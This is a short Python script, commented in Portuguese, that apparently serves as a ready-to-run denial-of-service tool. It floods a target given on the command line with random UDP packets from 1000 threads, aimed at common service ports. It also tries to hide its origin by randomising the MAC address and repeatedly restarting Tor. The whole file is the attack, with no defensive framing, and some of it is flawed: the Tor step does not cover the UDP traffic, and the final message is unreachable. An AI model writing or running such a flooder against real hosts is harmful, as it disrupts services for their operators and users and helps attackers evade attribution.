import socket  
import random  
import threading  
import sys  
import os  
import time  

 
def change_tor_ip():  
    os.system("pkill tor")  
    os.system("tor > /dev/null 2>&1 &")  
    time.sleep(10)  

def spoof_mac():  
    os.system("termux-setup-storage")  
    os.system("macchanger -r wlan0")  


ALVO = sys.argv[1]  
PORTAS = [80, 443, 53, 22, 8080]  
THREADS = 1000  
PACOTE = random._urandom(1024)  

 
def ataque():  
    while True:  
        try:  
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:  
                s.sendto(PACOTE, (ALVO, random.choice(PORTAS)))  
        except Exception as e:  
            print(f"Erro: {e} (ignorado)")  

 
spoof_mac()  
change_tor_ip()  


for _ in range(THREADS):  
    threading.Thread(target=ataque, daemon=True).start()  


while True:  
    time.sleep(300)  
    change_tor_ip()  

print(f"[🔥] ATAQUE INICIADO! ALVO: {ALVO}")  
